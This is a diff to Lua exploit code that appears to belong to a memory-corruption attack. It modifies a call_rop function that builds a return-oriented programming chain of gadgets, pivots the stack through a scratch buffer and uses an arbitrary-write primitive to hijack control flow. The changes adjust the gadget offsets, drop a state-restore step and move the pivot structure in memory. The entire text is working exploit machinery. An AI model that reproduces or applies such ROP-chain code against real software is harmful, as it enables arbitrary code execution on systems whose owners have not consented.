@@ -22,7 +22,7 @@ function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     local arg6 = process_arg(arg6)
     
     local function push_chain(value)
-        write64_unstable(LUA_PIVOT_SCRATCH + 0x40 + idx * 8, value)
+        write64_unstable(LUA_PIVOT_SCRATCH + idx * 8, value)
         idx = idx + 1
     end
     
@@ -61,7 +61,7 @@ function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     push_chain(MOV_RAX_DEREF_RAX_RET)
     local rbp_placeholder_offset = idx + 4
     push_chain(POP_RDI_RET)
-    push_chain(LUA_PIVOT_SCRATCH + 0x40 + rbp_placeholder_offset * 8)
+    push_chain(LUA_PIVOT_SCRATCH + rbp_placeholder_offset * 8)
     push_chain(MOV_DEREF_RDI_RAX_RET)
     push_chain(POP_RBP_RET)
     push_chain(0xDEADBEEF) -- dummy will be changed dynamically
@@ -104,13 +104,6 @@ function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     -- Restore registers
     push_chain(POP_R15_RET)
     push_chain(LUA_STATE)
-    
-    -- Restore corrupted LUA_PIVOT_SCRATCH at LUA_STATE
-    push_chain(POP_RAX_RET)
-    push_chain(LUA_PIVOT_SCRATCH)
-    push_chain(POP_RDI_RET)
-    push_chain(LUA_STATE)
-    push_chain(MOV_DEREF_RDI_RAX_RET)
 
     -- Calculate original RSP = RBP - 0x48
     push_chain(POP_RAX_RET)
@@ -123,13 +116,15 @@ function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     -- Write calculated RSP to the placeholder location
     local rsp_placeholder_offset = idx + 4
     push_chain(POP_RDI_RET)
-    push_chain(LUA_PIVOT_SCRATCH + 0x40 + rsp_placeholder_offset * 8)
+    push_chain(LUA_PIVOT_SCRATCH + rsp_placeholder_offset * 8)
     push_chain(MOV_DEREF_RDI_RAX_RET)
     push_chain(POP_RSP_RET)
     push_chain(0xDEADBEEF) -- dummy will be changed dynamically
     
-    write64_unstable(LUA_PIVOT_SCRATCH, 0x40)
-    write64_unstable(LUA_PIVOT_SCRATCH + 0x20, LUA_PIVOT2)
+    write64_unstable(LUA_PIVOT_SCRATCH - 0x100000, 0)
+    write64_unstable(LUA_PIVOT_SCRATCH - 0x100000 + 0x48, LUA_PIVOT2)
+    write64_unstable(LUA_PIVOT_SCRATCH - 0x100000 + 0x7, LUA_PIVOT_SCRATCH)
+    write64_unstable(LUA_PIVOT_RAX, LUA_PIVOT_SCRATCH - 0x100000)
     
     -- Execute ROP chain
     call_rop_internal()
